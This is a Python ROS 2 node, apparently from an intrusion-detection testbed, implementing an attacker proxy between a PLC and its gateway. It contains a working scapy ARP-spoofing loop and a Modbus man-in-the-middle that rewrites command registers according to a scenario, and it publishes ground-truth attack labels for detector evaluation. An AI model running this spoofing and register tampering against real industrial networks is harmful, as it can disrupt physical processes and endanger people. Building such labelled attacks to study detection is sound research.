import threading

from rclpy.node import Node

from ids_experiments.scenario import load_scenario
from ids_experiments.shutdown import init, spin_until_shutdown, StopFlag
from ids_interfaces.msg import AttackTruth
from ot_bridge.modbus_attacks import attacker_from_scenario
from ot_bridge.modbus_io import ContextStore, new_context, TcpStore
from ot_bridge.modbus_map import COIL_SAFE_STOP, COMMAND_REGISTERS


class ProxyCore:

    def __init__(self, attacker):
        self._attacker = attacker
        self._last_truth = None

    def refresh(self, t, upstream, downstream):
        registers = upstream.read_holding(0, COMMAND_REGISTERS)
        poisoned, truth = self._attacker.transform(t, registers)
        downstream.write_holding(0, poisoned)
        downstream.write_coil(COIL_SAFE_STOP, upstream.read_coil(COIL_SAFE_STOP))
        self._last_truth = truth
        return truth


class ArpSpoofer:

    def __init__(self, interface, victim_ip, gateway_ip, period=2.0):
        self.interface = interface
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.period = period
        self._stop = threading.Event()

    def _packets(self):
        from scapy.all import ARP, getmacbyip
        victim_mac = getmacbyip(self.victim_ip)
        gateway_mac = getmacbyip(self.gateway_ip)
        return (ARP(op=2, pdst=self.victim_ip, hwdst=victim_mac, psrc=self.gateway_ip),
                ARP(op=2, pdst=self.gateway_ip, hwdst=gateway_mac, psrc=self.victim_ip))

    def run(self):
        from scapy.all import send
        to_victim, to_gateway = self._packets()
        while not self._stop.is_set():
            send(to_victim, iface=self.interface, verbose=False)
            send(to_gateway, iface=self.interface, verbose=False)
            self._stop.wait(self.period)

    def stop(self):
        self._stop.set()


def _start_server(context, host, port):
    import asyncio

    from pymodbus.datastore import ModbusServerContext
    from pymodbus.server import StartAsyncTcpServer
    try:
        server_context = ModbusServerContext(slaves=context, single=True)
    except TypeError:
        server_context = ModbusServerContext(devices=context, single=True)

    def run():
        asyncio.run(StartAsyncTcpServer(context=server_context, address=(host, port)))

    thread = threading.Thread(target=run, daemon=True)
    thread.start()
    return thread


class AttackerProxy(Node):

    def __init__(self):
        super().__init__('attacker_proxy')
        self.declare_parameter('scenario_file', '')
        self.declare_parameter('plc_host', '10.203.10.20')
        self.declare_parameter('plc_port', 502)
        self.declare_parameter('listen_host', '0.0.0.0')
        self.declare_parameter('listen_port', 502)
        self.declare_parameter('scan_period', 0.01)
        self.declare_parameter('mode', 'redirect')
        self.declare_parameter('interface', 'eth0')
        self.declare_parameter('gateway_ip', '10.203.10.10')
        path = self.get_parameter('scenario_file').value
        scenario = load_scenario(path) if path else {'attacks': []}
        self._core = ProxyCore(attacker_from_scenario(scenario))
        self._downstream = ContextStore(new_context())
        self._upstream = TcpStore(self.get_parameter('plc_host').value,
                                  int(self.get_parameter('plc_port').value))
        self._upstream.connect()
        self._truth_pub = self.create_publisher(AttackTruth, '/attack/truth', 10)
        self._t0 = None
        self._arp = None
        if self.get_parameter('mode').value == 'arp':
            self._arp = ArpSpoofer(self.get_parameter('interface').value,
                                   self.get_parameter('plc_host').value,
                                   self.get_parameter('gateway_ip').value)
            threading.Thread(target=self._arp.run, daemon=True).start()
            self.get_logger().warn('ARP mode: spoofing the control bridge (needs NET_ADMIN; '
                                   'Docker Desktop/WSL2 may block it)')
        self._server = _start_server(self._downstream.context,
                                     self.get_parameter('listen_host').value,
                                     int(self.get_parameter('listen_port').value))
        self.create_timer(self.get_parameter('scan_period').value, self._tick)
        self.get_logger().info(
            f"attacker proxy ({self.get_parameter('mode').value}) between the PLC and the gateway")

    def _tick(self):
        now = self.get_clock().now().nanoseconds * 1e-9
        self._t0 = self._t0 if self._t0 is not None else now
        try:
            truth = self._core.refresh(now - self._t0, self._upstream, self._downstream)
        except (IOError, OSError):
            return
        self._publish_truth(truth)

    def _publish_truth(self, truth):
        msg = AttackTruth()
        msg.header.stamp = self.get_clock().now().to_msg()
        msg.attack_active = bool(truth.attack_active)
        msg.implant_active = True
        msg.kind = truth.kind
        msg.joint_mask = list(truth.joint_mask)
        msg.magnitude = float(truth.magnitude)
        msg.event_id = int(truth.event_id)
        self._truth_pub.publish(msg)

    def destroy_node(self):
        if self._arp is not None:
            self._arp.stop()
        super().destroy_node()


def main(args=None):
    init(args=args)
    stop = StopFlag()
    proxy = AttackerProxy()
    spin_until_shutdown(proxy, stop=stop)
    